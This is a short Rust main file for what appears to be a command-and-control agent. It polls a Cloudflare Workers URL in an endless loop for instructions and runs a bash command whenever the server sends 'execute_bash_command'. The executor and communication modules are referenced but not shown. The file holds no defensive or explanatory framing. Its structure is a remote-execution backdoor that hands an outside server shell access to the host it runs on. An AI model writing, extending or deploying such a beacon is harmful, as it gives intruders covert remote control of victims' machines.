mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    loop {
        let command = worker_communication::send_command_request(&worker_url).await;
        if command == "execute_bash_command" {
            command_executor::execute_bash_command();
        }
        // Add more conditions or logic to handle different commands
    }
}